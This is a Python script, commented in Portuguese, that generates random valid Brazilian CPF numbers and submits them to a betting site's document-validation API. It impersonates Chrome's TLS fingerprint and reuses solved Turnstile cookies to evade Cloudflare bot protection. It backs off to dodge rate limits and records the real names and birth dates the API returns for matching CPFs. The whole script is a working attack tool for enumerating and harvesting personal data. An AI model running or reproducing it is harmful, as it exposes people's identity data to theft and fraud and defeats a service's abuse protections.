#!/usr/bin/env python3
"""
CPF Validator Stealth - Bypass Cloudflare usando curl_cffi
===========================================================
Usa TLS fingerprint impersonation para evitar detecção do Cloudflare.

Instalar: pip install curl_cffi
"""
import random
import time
import json
from datetime import datetime

try:
    from curl_cffi import requests
    CURL_CFFI_AVAILABLE = True
except ImportError:
    CURL_CFFI_AVAILABLE = False
    print("⚠️  curl_cffi não instalado. Instale com: pip install curl_cffi")
    import requests
    

def gerar_cpf():
    """Gera um CPF matematicamente válido"""
    cpf = [random.randint(0, 9) for _ in range(9)]
    
    # Primeiro dígito verificador
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    
    # Segundo dígito verificador
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    
    return ''.join(map(str, cpf))


def formatar_cpf(cpf):
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"


def criar_sessao_stealth():
    """Cria sessão com TLS fingerprint do Chrome"""
    if CURL_CFFI_AVAILABLE:
        # Impersona Chrome 120 - TLS fingerprint idêntico
        session = requests.Session(impersonate="chrome120")
    else:
        session = requests.Session()
    
    return session


def validar_cpf_api(cpf, session, cookies=None):
    """Faz requisição para validar CPF na API"""
    url = "https://7k.bet.br/api/documents/validate"
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://7k.bet.br",
        "Referer": "https://7k.bet.br/",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    
    payload = {"number": cpf, "type": "cpf"}
    
    try:
        if cookies:
            for cookie in cookies:
                session.cookies.set(cookie["name"], cookie["value"], domain=cookie.get("domain", "7k.bet.br"))
        
        response = session.post(url, json=payload, headers=headers, timeout=15)
        
        return {
            "status_code": response.status_code,
            "response": response.text,
            "cookies": dict(session.cookies)
        }
    except Exception as e:
        return {"status_code": -1, "error": str(e)}


def obter_cookies_iniciais(session):
    """Obtém cookies do Cloudflare acessando a página principal"""
    print("\n📡 Obtendo cookies do Cloudflare...")
    
    try:
        # Acessa página principal para pegar cookies
        response = session.get("https://7k.bet.br/", timeout=15)
        
        cookies = dict(session.cookies)
        print(f"   Status: {response.status_code}")
        print(f"   Cookies obtidos: {list(cookies.keys())}")
        
        # Verifica se tem cookies do Cloudflare
        cf_cookies = [k for k in cookies.keys() if k.startswith(('__cf', '_cf', 'cf_'))]
        if cf_cookies:
            print(f"   ✅ Cookies do Cloudflare: {cf_cookies}")
        else:
            print(f"   ⚠️  Nenhum cookie do Cloudflare detectado")
        
        return cookies
    except Exception as e:
        print(f"   ❌ Erro: {e}")
        return {}


def carregar_cookies_salvos():
    """Tenta carregar cookies do arquivo cloudflare_token.json"""
    try:
        with open("cloudflare_token.json", "r") as f:
            data = json.load(f)
            if isinstance(data, list) and len(data) > 0:
                # Pega o último token/cookies
                entry = data[-1]
                cookies = entry.get("cookies", [])
                if cookies:
                    print(f"   ✅ Carregados {len(cookies)} cookies salvos")
                    return cookies
    except:
        pass
    return None


def main():
    print("=" * 70)
    print("🔍 CPF Validator Stealth - Bypass Cloudflare")
    print("=" * 70)
    
    if CURL_CFFI_AVAILABLE:
        print("✅ curl_cffi disponível - usando TLS fingerprint impersonation")
    else:
        print("⚠️  curl_cffi não disponível - usando requests padrão (pode ser bloqueado)")
    
    # Cria sessão stealth
    session = criar_sessao_stealth()
    
    # Tenta carregar cookies salvos primeiro
    saved_cookies = carregar_cookies_salvos()
    if saved_cookies:
        print("\n📂 Usando cookies salvos do Turnstile solver...")
        for cookie in saved_cookies:
            if isinstance(cookie, dict):
                session.cookies.set(
                    cookie.get("name", ""), 
                    cookie.get("value", ""), 
                    domain=cookie.get("domain", "7k.bet.br")
                )
    else:
        # Obtém cookies frescos
        obter_cookies_iniciais(session)
    
    print("\n" + "=" * 70)
    print("🔄 Iniciando testes de CPF...")
    print("=" * 70)
    
    resultados = {
        "validos": [],
        "invalidos": 0,
        "bloqueados": 0,
        "erros": 0
    }
    
    tentativas = 0
    max_tentativas = 100
    delay_base = 1.0  # Delay base entre requisições
    delay_atual = delay_base
    
    while tentativas < max_tentativas:
        tentativas += 1
        cpf = gerar_cpf()
        cpf_formatado = formatar_cpf(cpf)
        
        print(f"\n[{tentativas:3d}] Testando CPF: {cpf_formatado}", end=" ")
        
        resultado = validar_cpf_api(cpf, session)
        status = resultado.get("status_code")
        response_text = resultado.get("response", "")
        
        if status == 200:
            try:
                data = json.loads(response_text)
                nome = data.get("data", {}).get("name", "N/A")
                nascimento = data.get("data", {}).get("birth_date", "N/A")
                print(f"✅ VÁLIDO! {nome} ({nascimento})")
                resultados["validos"].append({
                    "cpf": cpf_formatado,
                    "nome": nome,
                    "nascimento": nascimento
                })
                delay_atual = delay_base  # Reset delay
            except:
                print(f"✅ VÁLIDO! (parse error)")
                
        elif status == 400:
            print(f"❌ Não existe")
            resultados["invalidos"] += 1
            delay_atual = delay_base
            
        elif status == 422:
            print(f"⚠️  Erro de validação: {response_text[:50]}")
            resultados["erros"] += 1
            
        elif status == 429:
            print(f"⏳ RATE LIMIT!")
            resultados["bloqueados"] += 1
            delay_atual = min(delay_atual * 2, 30)  # Backoff exponencial
            print(f"     Aumentando delay para {delay_atual:.1f}s...")
            
        elif status == 403:
            print(f"🚫 BLOQUEADO pelo Cloudflare!")
            resultados["bloqueados"] += 1
            delay_atual = min(delay_atual * 2, 30)
            
        elif status == -1:
            print(f"💥 Erro: {resultado.get('error', 'Unknown')[:40]}")
            resultados["erros"] += 1
            
        else:
            print(f"❓ Status {status}")
            resultados["erros"] += 1
        
        # Verifica se está bloqueado
        if resultados["bloqueados"] >= 3:
            print("\n" + "=" * 70)
            print("🚫 MUITOS BLOQUEIOS - Parando para evitar ban!")
            print("=" * 70)
            print("\n💡 Sugestões:")
            print("   1. Execute o turnstile_persistent_solver.py para obter cookies válidos")
            print("   2. Use um proxy diferente")
            print("   3. Aguarde alguns minutos antes de tentar novamente")
            break
        
        # Delay adaptativo
        time.sleep(delay_atual + random.uniform(0.1, 0.5))
    
    # Resumo final
    print("\n" + "=" * 70)
    print("📊 RESUMO FINAL")
    print("=" * 70)
    print(f"Total de tentativas: {tentativas}")
    print(f"CPFs válidos encontrados: {len(resultados['validos'])}")
    print(f"CPFs inválidos: {resultados['invalidos']}")
    print(f"Bloqueios: {resultados['bloqueados']}")
    print(f"Erros: {resultados['erros']}")
    
    if resultados["validos"]:
        print("\n✅ CPFs VÁLIDOS ENCONTRADOS:")
        for r in resultados["validos"]:
            print(f"   {r['cpf']} - {r['nome']} ({r['nascimento']})")
    
    # Salva resultados
    with open("cpf_resultados.json", "w", encoding="utf-8") as f:
        json.dump({
            "timestamp": datetime.now().isoformat(),
            "resultados": resultados
        }, f, indent=2, ensure_ascii=False)
    
    print(f"\n💾 Resultados salvos em cpf_resultados.json")
    print("=" * 70)


if __name__ == "__main__":
    main()







